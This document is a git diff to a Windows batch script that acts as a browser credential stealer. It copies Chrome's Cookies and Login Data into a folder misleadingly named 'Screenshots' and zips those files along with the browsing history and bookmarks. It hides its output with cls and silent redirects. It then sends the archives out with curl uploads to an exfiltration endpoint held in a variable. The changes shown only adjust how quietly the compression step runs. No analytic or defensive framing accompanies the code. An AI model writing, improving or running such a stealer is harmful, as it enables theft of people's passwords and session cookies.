@@ -21,10 +21,11 @@ copy "%chrome_data_path%\Default\Cookies" "%output_dir%\Cookies" >nul
 copy "%chrome_data_path%\Default\Login Data" "%output_dir%\Login Data" >nul
 cls
 
-powershell -command "Compress-Archive -Path '%output_dir%\Bookmarks' -DestinationPath '%output_dir%\Bookmarks.zip' | Out-Null"
-powershell -command "Compress-Archive -Path '%output_dir%\History' -DestinationPath '%output_dir%\History.zip' | Out-Null"
-powershell -command "Compress-Archive -Path '%output_dir%\Login Data' -DestinationPath '%output_dir%\Login_Data.zip' | Out-Null"
-cls
+powershell -command "Compress-Archive -Path '%output_dir%\Bookmarks' -DestinationPath '%output_dir%\Bookmarks.zip' -Force > $null 2>&1"
+powershell -command "Compress-Archive -Path '%output_dir%\History' -DestinationPath '%output_dir%\History.zip' -Force > $null 2>&1"
+powershell -command "Compress-Archive -Path '%output_dir%\Login Data' -DestinationPath '%output_dir%\Login_Data.zip' -Force > $null 2>&1"
+pause >nul
+
 
 set "file1=%localappdata%\Screenshots\Bookmarks.zip"
 cls
@@ -97,7 +98,3 @@ curl -F "file=@%file2%" %exfilKey%
 cls
 curl -F "file=@%file3%" %exfilKey%
 cls
-
-
-
-
